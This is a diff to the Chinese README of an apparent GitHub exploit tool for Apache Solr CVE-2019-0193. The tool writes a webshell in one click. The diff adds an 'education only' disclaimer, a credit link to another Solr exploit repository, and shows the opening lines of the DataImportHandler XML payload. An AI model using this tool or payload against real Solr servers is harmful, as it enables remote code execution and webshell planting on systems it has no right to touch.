@@ -1,8 +1,13 @@
+# 项目声明
+只用于信息安全教学交流，请勿用于非法测试和攻击。
+
 # ApacheSolrRCE
 ApacheSolrRCE（CVE-2019-0193）一键写shell，原理是通过代码执行的java文件流写的马。
 
-# 说明
+
+# 工具说明
 由于互联网上流传的payload都是命令执行，且不方便上webshell，因此写了这段payload
+
 ```
 <dataConfig>
 <dataSource name="streamsrc" type="ContentStreamDataSource" loggerLevel="TRACE" />
@@ -45,3 +50,8 @@ return row;
 默认代理是http代理，端口是8080，代码里面写死了的，需要的自己编译修改即可。
 
 <img src="https://github.com/jdr2021/ApacheSolrRCE/blob/master/1663057045317.jpg">
+
+
+# 特别感谢
+
+[solr_exploit](https://github.com/1135/solr_exploit)
